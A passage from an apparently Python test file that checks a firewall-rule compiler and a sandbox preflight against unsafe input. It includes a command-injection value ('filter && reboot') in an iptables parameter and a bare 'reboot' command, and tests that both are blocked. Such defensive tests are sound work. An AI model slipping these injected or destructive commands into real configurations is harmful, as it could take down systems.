            target_node="dc-egress",
            target_platform=TargetPlatform.LINUX_IPTABLES,
            source_ip="10.0.0.1",
            extra_params={"table": "filter && reboot"},
        )
        res = compiler.compile(intent, raise_on_unsafe=False)
        assert res.is_safe is False
        assert "reboot" in res.validation_error.lower() or "violation" in res.validation_error.lower()

        with pytest.raises(AALSecurityError):
            compiler.compile(intent, raise_on_unsafe=True)

    def test_shadow_sandbox_preflight_blocks_destructive_commands(self, mock_adapter, aal_instance):
        """ShadowSandboxManager preflight verification must intercept blocked commands with exit code 126."""
        report = ShadowSandboxManager.run_preflight_verification(
            node_name="dc-egress",
            commands=[
                "iptables -I FORWARD -s 10.0.0.1 -j DROP",
                "reboot",  # Blocked
                "iptables -I FORWARD -s 10.0.0.2 -j DROP",
            ],
            adapter=mock_adapter,
            aal=aal_instance,
        )
        assert report.all_passed is False
        assert 126 in report.exit_codes
        assert report.verify_clean_pass() is False
        # Execution halted at reboot
        assert len(report.commands_executed) == 2
